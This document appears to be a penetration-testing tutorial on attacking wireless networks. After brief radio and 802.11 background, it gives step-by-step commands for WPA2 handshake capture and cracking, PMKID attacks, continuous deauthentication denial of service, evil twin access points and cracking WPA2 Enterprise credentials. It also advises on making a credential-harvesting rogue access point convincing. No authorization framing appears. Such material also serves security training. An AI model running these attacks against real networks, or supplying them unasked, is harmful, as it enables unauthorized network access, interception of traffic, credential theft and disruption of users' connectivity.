# Wireless Networks

**Radio Fundamentals**

Wi-Fi is radio communication. Key concepts:

**Frequency bands:**

* **2.4 GHz:** longer range, more wall penetration, more congested (shared with Bluetooth, microwaves). Channels 1, 6, and 11 are non-overlapping.
* **5 GHz**:shorter range, faster speeds, less congested. More channels available.
* **6 GHz**: Wi-Fi 6E, newer, not widely deployed yet.

**SSID vs BSSID:**

* **SSID**: the human-readable network name ("CorpWifi")
* **BSSID**: the MAC address of the access point radio

Multiple APs can share the same SSID (enterprise deployments do this for roaming). The BSSID uniquely identifies one AP.

**Signal and range:** Radio signals weaken with distance and obstacles. Signal strength is measured in dBm and higher (less negative) is better. `-50 dBm` is excellent; `-80 dBm` is marginal. In practice, you can attack networks from a parking lot with a directional antenna and appropriate adapter.

**802.11 Frame Types**

**Management frames**:coordinate the relationship between clients and APs. Beacon frames, probe requests/responses, authentication, association/disassociation, deauthentication. Crucially, management frames in WPA2 (and WPA3 without PMF) are **not encrypted and not authenticated** so anyone can forge them.

**Control frames**: facilitate data frame delivery. ACK, RTS (Request to Send), CTS (Clear to Send). Low-level MAC coordination.

**Data frames**: carry actual payload. Encrypted in WPA2/WPA3.

The fact that management frames are unprotected by default is the root cause of deauthentication attacks.

**Monitor Mode and Capture**

Your wireless interface must be in **monitor mode** to capture raw 802.11 frames (including packets not addressed to you).

bash

```bash
# Check interface name
iw dev
ip link

# Put interface into monitor mode
airmon-ng check kill      # kill processes that may interfere
airmon-ng start wlan0     # creates wlan0mon

# Manual alternative
ip link set wlan0 down
iw wlan0 set monitor control
ip link set wlan0 up

# Capture traffic
airodump-ng wlan0mon                           # all channels, all networks
airodump-ng wlan0mon -c 6                      # specific channel
airodump-ng wlan0mon -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture   # specific AP, save to file
```

airodump-ng output:

```
BSSID              PWR  Beacons  #Data  CH  ENC   CIPHER  AUTH  ESSID
AA:BB:CC:DD:EE:FF  -45  120      1520   6   WPA2  CCMP    PSK   CorpWifi
```

**WPA2-PSK Attack**

**How WPA2-PSK works:** The password (Pre-Shared Key) and the SSID are used to derive a **PMK (Pairwise Master Key)**. During the four-way handshake, the PMK is used to derive a **PTK (Pairwise Transient Key)** that actually encrypts the session. The handshake is verifiable against a password guess so if you capture it, you can test passwords offline.

bash

```bash
# Step 1: Capture the handshake
# Start capturing targeted at the AP
airodump-ng wlan0mon -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture

# Step 2: Force a client to reconnect (sends deauth frames)
# Run in a second terminal while capture runs
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c <client_mac> wlan0mon
# -0 = deauth attack, 5 = number of frames

# Wait for "WPA handshake: AA:BB:CC:DD:EE:FF" in airodump

# Step 3: Crack with aircrack-ng
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Step 4: Or convert and crack with hashcat (GPU, much faster)
hcxpcapngtool -o hash.hc22000 capture-01.cap
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
hashcat -m 22000 hash.hc22000 -a 3 ?u?l?l?l?d?d?d?d   # mask attack
```

**PMKID attack**: no client interaction required. The PMKID is broadcast in the first EAPOL message from the AP and is derivable from the PMK. Capture it passively and crack offline.

bash

```bash
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
hcxpcapngtool -o hash.hc22000 pmkid.pcapng
hashcat -m 22000 hash.hc22000 wordlist.txt
```

**Deauthentication Attack**

802.11 deauth frames tell a client "you are disconnected." They can be sent by anyone to anyone, no authentication required. This is used to:

* Force clients to reconnect (capture handshake)
* Knock clients off the real AP (prior to evil twin)
* Denial of service

bash

```bash
# Deauth all clients from an AP
aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon   # -0 0 = continuous

# Deauth specific client
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c <client_mac> wlan0mon
```

WPA3 and Wi-Fi Protected Management Frames (PMF/802.11w) make deauth attacks much harder since deauth frames are authenticated. Increasingly common in newer deployments.

**Evil Twin Attack**

An evil twin is a rogue AP impersonating a legitimate one. Clients that connect to it use your machine as their gateway and you see all their traffic.

bash

```bash
# hostapd-wpe — designed for WPA2 Enterprise credential capture
# Edit hostapd-wpe.conf with target SSID, channel, and interface
hostapd-wpe hostapd-wpe.conf
# Captured EAP credentials saved to hostapd-wpe.log

# Simpler evil twin with airbase-ng
airbase-ng -e "TargetSSID" -c 6 wlan0mon
# Creates at0 interface — bridge it to internet for captive portal setup
```

For a convincing attack: match the BSSID of the real AP, deauth clients from the real AP simultaneously, and serve a captive portal or credential page on your rogue AP.

**WPA2 Enterprise (802.1X)**

Enterprise Wi-Fi uses individual credentials against a RADIUS server rather than a shared password. More secure but attackable when clients don't validate the RADIUS server certificate.

A rogue AP with a fake RADIUS server captures EAP credentials from clients that connect without certificate validation. The captured MSCHAPv2 challenge-response can be cracked to recover the plaintext password.

bash

```bash
# hostapd-wpe handles the fake RADIUS automatically
# Captured credentials look like:
# username: jsmith
# challenge: [hex]
# response: [hex]

# Crack MSCHAPv2 with asleap
asleap -C <challenge> -R <response> -W /usr/share/wordlists/rockyou.txt
```
